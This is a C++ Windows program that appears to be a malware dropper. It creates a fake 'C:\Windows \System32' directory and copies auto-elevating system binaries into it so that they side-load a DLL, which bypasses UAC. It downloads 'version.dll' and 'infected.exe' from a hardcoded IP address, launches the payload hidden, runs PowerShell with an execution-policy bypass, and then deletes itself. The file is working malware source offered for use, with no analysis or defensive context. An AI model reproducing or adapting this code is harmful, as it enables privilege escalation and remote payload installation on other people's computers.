#include <iostream>
#include <vector>
#include <Windows.h>
#include <filesystem>
#include <Tlhelp32.h>
#include <shlobj_core.h>
#include <random>
#include <tchar.h>

#pragma comment(lib, "urlmon.lib")

static void SelfDelete() {
    TCHAR szFile[MAX_PATH], szCmd[MAX_PATH];
    if ((GetModuleFileName(0, szFile, MAX_PATH) != 0) && (GetShortPathName(szFile, szFile, MAX_PATH) != 0)) {
        lstrcpy(szCmd, _T("/c del "));
        lstrcat(szCmd, szFile);
        lstrcat(szCmd, _T(" >> NUL"));
        if ((GetEnvironmentVariable(_T("ComSpec"), szFile, MAX_PATH) != 0) && ((INT)ShellExecute(0, 0, szFile, szCmd, 0, SW_HIDE) > 32))
            return;
    }
    return;
}

using namespace std;

void KillProcessByName(const std::wstring& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return;
    }
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &processEntry)) {
        do {
            std::wstring currentProcessName = processEntry.szExeFile;
            if (currentProcessName == processName) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processEntry.th32ProcessID); //Open the process with termination rights
                if (hProcess != NULL) {
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                }
            }
        } while (Process32Next(hSnapshot, &processEntry));
    }
    CloseHandle(hSnapshot);
}

void StartPatch() {
    LPCTSTR payload_link = L"http://46.226.161.110/version.dll";
    LPCTSTR exe_link = L"http://46.226.161.110/infected.exe";
    vector<wstring> executeables = { L"systemreset.exe", L"SystemSettingsAdminFlows.exe" };
    vector<wstring> dlls = {         L"version.dll",     L"version.dll", };
    wchar_t systemPath[MAX_PATH];

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(STARTUPINFO));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    si.cb = sizeof(STARTUPINFO);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    GetSystemDirectory(systemPath, MAX_PATH); // returns C:\Windows\System32
    wstring windowslocation(systemPath);
    wstring rootDrive = windowslocation.substr(0, 3); // returns "C:\"
    wstring mockdir = L"\\\\?\\" + rootDrive + L"Windows \\System32"; // returns C:\Windows \System32

    if (filesystem::exists(mockdir) && filesystem::is_directory(mockdir)) {
        wstring removeCommand = L"powershell.exe -NoLogo -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy bypass -Command \"Remove-Item '" + wstring(L"\\\\?\\") + rootDrive + L"Windows \\' -Force -Recurse\"";
        CreateProcess(NULL, const_cast<LPWSTR>(removeCommand.c_str()), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    std::random_device rd;
    std::mt19937 rng(rd());
    std::uniform_int_distribution<int> uni(0, dlls.size() - 1);
    int chosen = uni(rng);
    wstring executable_name = executeables[chosen];
    wstring dll_name = dlls[chosen];

    CreateDirectory((rootDrive + L"Windows \\").c_str(), NULL); //Create the directory C:\Windows \System32 if it doesn't exist
    CreateDirectory(mockdir.c_str(), NULL);
    CopyFile((windowslocation + L"\\" + executable_name).c_str(), (mockdir + L"\\" + executable_name).c_str(), FALSE); //Copy the executable file to the mock directory
    URLDownloadToFile(NULL, payload_link, (mockdir + L"\\" + dll_name).c_str(), 0, NULL); //Download the dll from the server to C:\Windows \System32
    
    wchar_t TempDirPath[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, TempDirPath);
    wchar_t payload_path[MAX_PATH + MAX_PATH];
    swprintf_s(payload_path, MAX_PATH + MAX_PATH, L"%s%s", TempDirPath, L"\\infected.exe");
    URLDownloadToFile(NULL, exe_link, payload_path, 0, NULL); //Download the infected.exe from the server to Windows temp folder

    wstring command = L"cmd.exe /c \"" + rootDrive + L"Windows \\System32\\" + executable_name + L"\"";
    CreateProcess(NULL, const_cast<LPWSTR>(command.c_str()), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    Sleep(3000 + (rand() % 500));
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    //KillProcessByName(executable_name.c_str());

    //wstring removeCommand = L"powershell.exe -NoLogo -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy bypass -Command \"Remove-Item '" + wstring(L"\\\\?\\") + rootDrive + L"Windows \\' -Force -Recurse\"";
    //CreateProcess(NULL, const_cast<LPWSTR>(removeCommand.c_str()), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    //WaitForSingleObject(pi.hProcess, INFINITE);
    //CloseHandle(pi.hProcess);
    //CloseHandle(pi.hThread);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    StartPatch();
    SelfDelete();
    return 0;
}
